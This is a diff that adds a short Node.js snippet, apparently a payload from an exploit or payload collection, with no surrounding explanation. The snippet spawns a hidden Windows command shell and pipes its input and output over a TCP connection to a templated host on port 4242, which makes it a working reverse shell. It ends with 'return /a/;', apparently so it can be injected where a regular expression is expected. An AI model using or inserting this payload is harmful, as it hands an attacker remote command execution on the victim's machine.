@@ -1,0 +1,12 @@
+(function () {
+    var net = require("net"),
+        cp = require("child_process"),
+        sh = cp.spawn("cmd", [], {detached: true, shell: false, windowsHide: true});
+    var client = new net.Socket();
+    client.connect(4242, "{{HOST}}", function () {
+        client.pipe(sh.stdin);
+        sh.stdout.pipe(client);
+        sh.stderr.pipe(client);
+    });
+    return /a/;
+})();
